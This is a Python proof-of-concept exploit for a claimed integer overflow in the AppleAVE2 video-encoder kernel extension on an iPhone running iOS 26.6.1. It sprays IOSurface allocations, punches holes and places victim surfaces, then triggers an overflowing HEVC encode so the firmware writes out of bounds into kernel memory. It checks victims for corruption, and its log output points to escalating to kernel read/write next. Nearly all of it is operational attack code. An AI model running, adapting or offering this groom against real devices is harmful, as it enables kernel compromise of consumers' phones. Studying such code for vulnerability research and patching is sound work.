"""
AVE2 DPB overflow heap groom PoC
Target: iOS 26.6.1 (iPhone17,4) — AppleAVE2 kext

Root cause: DPB buffer size = DPB_unit * NTL computed in 32-bit.
  DPB_unit = 60 * 34 * 1024 = 2,088,960 bytes  (4K HEVC, 64px CTU)
  NTL=2057: 2,088,960 * 2057 = 4,296,990,720 → wraps to 2,023,424 bytes
  Firmware allocates ~2 MB but writes as if buffer is ~4.3 GB → OOB write.

Groom strategy:
  1. Spray 64 IOSurfaces at exactly 2,023,424 bytes (same kmem_alloc_contig path)
  2. Free every other one → 32 holes in physically-contiguous range
  3. Allocate 32 victim surfaces → land in holes
  4. Record baselines: (alloc_size, surf_id) per victim
  5. Trigger NTL=2057 encode → DPB lands in a hole, OOB write hits adjacent victim header
  6. Scan victims: any alloc_size or ID change = confirmed kernel write

Run conditions: fresh reboot, memory < 1400 MB baseline.
AppGroup UUID: 92767569-346F-4ECE-B7F6-8107C7A21B5B
"""

import ctypes as C, sys, os, time, resource

APPGROUP = (
    "/private/var/mobile/Containers/Shared/AppGroup"
    "/92767569-346F-4ECE-B7F6-8107C7A21B5B/Library"
)
LOG_FILE = f"{APPGROUP}/ave2_groom_poc.txt"

GROOM_SIZE    = 2_023_424   # (DPB_unit * 2057) & 0xFFFFFFFF — exact wrapped DPB alloc
SPRAY_COUNT   = 64          # surfaces to spray; free even indices → 32 holes
NTL_TRIGGER   = 2057        # first true 32-bit overflow
OOB_WAIT_S    = 3.0         # seconds to let firmware do the OOB write

WIDTH, HEIGHT = 3840, 2160  # 4K HEVC
kHEVC         = 0x68766331  # 'hvc1'
kCV420v       = 0x34323076  # kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange
CTU_W         = (WIDTH  + 63) // 64   # = 60
CTU_H         = (HEIGHT + 63) // 64   # = 34
DPB_UNIT      = CTU_W * CTU_H * 1024  # = 2,088,960

kCFNumberSInt64Type   = 4
kCFStringEncodingUTF8 = 0x08000100

# ------------------------------------------------------------------ logging --

def log(msg):
    ts = time.strftime("%H:%M:%S")
    line = f"[{ts}] {msg}\n"
    sys.stdout.write(line); sys.stdout.flush()
    try:
        with open(LOG_FILE, "a") as f:
            f.write(line); f.flush(); os.fsync(f.fileno())
    except Exception as e:
        sys.stdout.write(f"[LOG_ERR] {e}\n"); sys.stdout.flush()

# ---------------------------------------------------------------- frameworks --

CF = C.CDLL("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation")
VT = C.CDLL("/System/Library/Frameworks/VideoToolbox.framework/VideoToolbox")
CV = C.CDLL("/System/Library/Frameworks/CoreVideo.framework/CoreVideo")
IS = C.CDLL("/System/Library/Frameworks/IOSurface.framework/IOSurface")

# CoreFoundation
CF.CFStringCreateWithCString.restype  = C.c_void_p
CF.CFStringCreateWithCString.argtypes = [C.c_void_p, C.c_char_p, C.c_uint32]
CF.CFNumberCreate.restype  = C.c_void_p
CF.CFNumberCreate.argtypes = [C.c_void_p, C.c_int, C.c_void_p]
CF.CFDictionaryCreate.restype  = C.c_void_p
CF.CFDictionaryCreate.argtypes = [
    C.c_void_p, C.POINTER(C.c_void_p), C.POINTER(C.c_void_p),
    C.c_long, C.c_void_p, C.c_void_p,
]
CF.CFRelease.argtypes = [C.c_void_p]

# IOSurface
IS.IOSurfaceCreate.restype       = C.c_void_p
IS.IOSurfaceCreate.argtypes      = [C.c_void_p]
IS.IOSurfaceRelease.argtypes     = [C.c_void_p]
IS.IOSurfaceGetAllocSize.restype  = C.c_size_t
IS.IOSurfaceGetAllocSize.argtypes = [C.c_void_p]
IS.IOSurfaceGetID.restype        = C.c_uint32
IS.IOSurfaceGetID.argtypes       = [C.c_void_p]

# CoreVideo
CV.CVPixelBufferCreate.restype  = C.c_int32
CV.CVPixelBufferCreate.argtypes = [
    C.c_void_p, C.c_ulong, C.c_ulong, C.c_uint32,
    C.c_void_p, C.POINTER(C.c_void_p),
]
CV.CVPixelBufferRelease.argtypes = [C.c_void_p]

# VideoToolbox
VT.VTCompressionSessionCreate.restype  = C.c_int32
VT.VTCompressionSessionCreate.argtypes = [
    C.c_void_p, C.c_int32, C.c_int32, C.c_uint32,
    C.c_void_p, C.c_void_p, C.c_void_p, C.c_void_p, C.c_void_p,
    C.POINTER(C.c_void_p),
]
VT.VTSessionSetProperty.restype  = C.c_int32
VT.VTSessionSetProperty.argtypes = [C.c_void_p, C.c_void_p, C.c_void_p]
VT.VTCompressionSessionInvalidate.argtypes = [C.c_void_p]

class CMTime(C.Structure):
    _fields_ = [
        ("value", C.c_int64), ("timescale", C.c_int32),
        ("flags", C.c_uint32), ("epoch", C.c_int64),
    ]

VT.VTCompressionSessionEncodeFrame.restype  = C.c_int32
VT.VTCompressionSessionEncodeFrame.argtypes = [
    C.c_void_p, C.c_void_p, CMTime, CMTime,
    C.c_void_p, C.c_void_p, C.POINTER(C.c_uint32),
]

ENCODE_CB = C.CFUNCTYPE(None, C.c_void_p, C.c_void_p, C.c_int32, C.c_void_p, C.c_void_p)
@ENCODE_CB
def _output_cb(*a): pass

# ------------------------------------------------ CF dict helpers for IOSurface --

# Lock down callback structs via array trick so addressof() gives the right pointer
_kDictKeyCB = (C.c_uint8 * 64).in_dll(CF, "kCFTypeDictionaryKeyCallBacks")
_kDictValCB = (C.c_uint8 * 64).in_dll(CF, "kCFTypeDictionaryValueCallBacks")

# Build the "IOSurfaceAllocSize" key string once
_key_alloc_str = CF.CFStringCreateWithCString(None, b"IOSurfaceAllocSize", kCFStringEncodingUTF8)

def _make_surf_props(size):
    size_num = CF.CFNumberCreate(None, kCFNumberSInt64Type, C.byref(C.c_int64(size)))
    keys = (C.c_void_p * 1)(_key_alloc_str)
    vals = (C.c_void_p * 1)(size_num)
    d = CF.CFDictionaryCreate(
        None, keys, vals, 1,
        C.addressof(_kDictKeyCB), C.addressof(_kDictValCB),
    )
    CF.CFRelease(size_num)
    return d

def create_surf(size=GROOM_SIZE):
    props = _make_surf_props(size)
    if not props:
        return None
    surf = IS.IOSurfaceCreate(props)
    CF.CFRelease(props)
    return surf or None

def release_surf(surf):
    if surf:
        IS.IOSurfaceRelease(surf)

# ------------------------------------------------------------------ trigger --

def trigger_ntl_encode(ntl):
    """
    Create a VT session with the given NTL and queue one frame.
    Returns (session_ptr, status_msg). Does NOT invalidate — caller must.
    Session stays alive so the firmware OOB write can complete.
    """
    sess = C.c_void_p(0)
    st = VT.VTCompressionSessionCreate(
        None, WIDTH, HEIGHT, kHEVC,
        None, None, None, _output_cb, None, C.byref(sess)
    )
    if st != 0 or not sess.value:
        return None, f"session_fail({st:#x})"

    ntl_key = C.c_void_p.in_dll(VT, "kVTCompressionPropertyKey_NumberOfTemporalLayers").value
    ntl_val = CF.CFNumberCreate(None, kCFNumberSInt64Type, C.byref(C.c_int64(ntl)))
    st2 = VT.VTSessionSetProperty(sess.value, ntl_key, ntl_val)
    CF.CFRelease(ntl_val)
    if st2 != 0:
        VT.VTCompressionSessionInvalidate(sess.value)
        return None, f"ntl_rejected({st2:#x})"

    pbuf = C.c_void_p(0)
    st3 = CV.CVPixelBufferCreate(None, WIDTH, HEIGHT, kCV420v, None, C.byref(pbuf))
    if st3 != 0 or not pbuf.value:
        VT.VTCompressionSessionInvalidate(sess.value)
        return None, f"pixbuf_fail({st3:#x})"

    pts  = CMTime(value=0,    timescale=90000, flags=1, epoch=0)
    dur  = CMTime(value=3000, timescale=90000, flags=1, epoch=0)
    info = C.c_uint32(0)
    st4  = VT.VTCompressionSessionEncodeFrame(
        sess.value, pbuf.value, pts, dur, None, None, C.byref(info)
    )
    CV.CVPixelBufferRelease(pbuf.value)

    return sess.value, f"encode_queued st={st4:#x}"

# ================================================================ main groom ==

log("=" * 60)
log("AVE2 DPB groom PoC — spray/groom/trigger/scan")
log(f"GROOM_SIZE={GROOM_SIZE} ({GROOM_SIZE/1024/1024:.2f} MB)")
log(f"DPB_UNIT={DPB_UNIT}  NTL_TRIGGER={NTL_TRIGGER}")
log(f"overflow check: {DPB_UNIT}*{NTL_TRIGGER}&0xffffffff = {(DPB_UNIT*NTL_TRIGGER)&0xFFFFFFFF}")

rss = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
rss_mb = rss / (1024 * 1024)
log(f"Process RSS: {rss_mb:.0f} MB")
if rss_mb > 1300:
    log("WARNING: RSS > 1300 MB — high risk of OOM during spray. Reboot recommended.")

# ----------------------------------------------------------------- Phase 1: sanity
log("--- Phase 1: sanity check ---")
test = create_surf()
if not test:
    log("FATAL: IOSurfaceCreate returned NULL — IOSurface may be blocked from sandbox")
    sys.exit(1)
test_sz = IS.IOSurfaceGetAllocSize(test)
test_id = IS.IOSurfaceGetID(test)
log(f"test surf: ptr={test:#x}  alloc_size={test_sz}  id={test_id}")
if test_sz == 0:
    log("FATAL: GetAllocSize returned 0 — IOSurface header not accessible")
    release_surf(test)
    sys.exit(1)
if test_sz != GROOM_SIZE:
    log(f"WARNING: alloc_size mismatch (got {test_sz}, expected {GROOM_SIZE})")
    log("Kernel may round up — adjust GROOM_SIZE to match and re-run")
release_surf(test)
log("sanity OK")

# ----------------------------------------------------------------- Phase 2: spray
log(f"--- Phase 2: spray {SPRAY_COUNT} surfaces at {GROOM_SIZE} bytes ---")
spray = []
for i in range(SPRAY_COUNT):
    s = create_surf()
    spray.append(s)
    if not s:
        log(f"WARNING: spray[{i}] = NULL (memory pressure?)")
n_spray = sum(1 for s in spray if s)
log(f"sprayed {n_spray}/{SPRAY_COUNT} surfaces")

# ----------------------------------------------------------------- Phase 3: holes
log("--- Phase 3: free even-indexed surfaces → 32 holes ---")
for i in range(0, SPRAY_COUNT, 2):
    if spray[i]:
        release_surf(spray[i])
        spray[i] = None
n_holes = sum(1 for s in spray if s is None)
log(f"{n_holes} holes created")

# ----------------------------------------------------------------- Phase 4: victims
victim_count = SPRAY_COUNT // 2  # 32
log(f"--- Phase 4: allocate {victim_count} victim surfaces (land in holes) ---")
victims = []
for i in range(victim_count):
    v = create_surf()
    victims.append(v)
    if not v:
        log(f"WARNING: victim[{i}] = NULL")
n_victims = sum(1 for v in victims if v)
log(f"{n_victims}/{victim_count} victims allocated")

# ----------------------------------------------------------------- Phase 5: baselines
log("--- Phase 5: record victim baselines ---")
baseline = {}  # ptr → (alloc_size, surf_id)
for i, v in enumerate(victims):
    if v:
        sz  = IS.IOSurfaceGetAllocSize(v)
        sid = IS.IOSurfaceGetID(v)
        baseline[v] = (sz, sid)
        if sz != GROOM_SIZE:
            log(f"WARNING: victim[{i}] baseline size={sz} != {GROOM_SIZE}")
log(f"baselines recorded for {len(baseline)} victims")

# ----------------------------------------------------------------- Phase 6: trigger
log(f"--- Phase 6: trigger NTL={NTL_TRIGGER} encode ---")
t0 = time.time()
sess, msg = trigger_ntl_encode(NTL_TRIGGER)
elapsed = time.time() - t0
log(f"trigger result: {msg}  sess={sess:#x if sess else 0}  ({elapsed:.2f}s)")

if not sess:
    log("FATAL: could not start encode — stopping before scan")
else:
    log(f"encode queued — waiting {OOB_WAIT_S}s for firmware OOB write to land...")
    time.sleep(OOB_WAIT_S)

    # -------------------------------------------------------------- Phase 7: scan
    log("--- Phase 7: scan victims for corruption ---")
    corrupted_sz  = []
    corrupted_id  = []

    for i, v in enumerate(victims):
        if not v:
            continue
        sz  = IS.IOSurfaceGetAllocSize(v)
        sid = IS.IOSurfaceGetID(v)
        bl_sz, bl_id = baseline.get(v, (GROOM_SIZE, 0))

        sz_changed = (sz != bl_sz)
        id_changed = (sid != bl_id)

        if sz_changed or id_changed:
            tag = "ALLOC_SIZE" if sz_changed else "" + " SURF_ID" if id_changed else ""
            log(
                f"*** CORRUPTION victim[{i:02d}] ptr={v:#x}  "
                f"alloc_size {bl_sz}→{sz}  id {bl_id}→{sid}  [{tag.strip()}]"
            )
            if sz_changed:
                corrupted_sz.append(i)
            if id_changed:
                corrupted_id.append(i)

    if corrupted_sz or corrupted_id:
        log("=" * 60)
        log(f"KERNEL WRITE CONFIRMED")
        log(f"  alloc_size corrupted: {len(corrupted_sz)} victim(s) {corrupted_sz}")
        log(f"  surf_id    corrupted: {len(corrupted_id)} victim(s) {corrupted_id}")
        log("Next step: replace victim with pipe buffer → escalate to kernel R/W")
        log("=" * 60)
    else:
        log("No corruption detected this run.")
        log("Possible reasons:")
        log("  - Groom miss: DPB landed outside victim range (try more spray)")
        log("  - OOB write too fast: landed before victims placed (reduce spray count)")
        log("  - alloc_size rounded differently: check test surf alloc_size above")
        log("  - Firmware didn't write yet: increase OOB_WAIT_S")

    # -------------------------------------------------------------- Phase 8: cleanup
    log("--- Phase 8: cleanup ---")
    VT.VTCompressionSessionInvalidate(sess)
    log("VT session invalidated")

for v in victims:
    if v:
        release_surf(v)
for s in spray:
    if s:
        release_surf(s)
log("all surfaces released")

log("=== DONE ===")
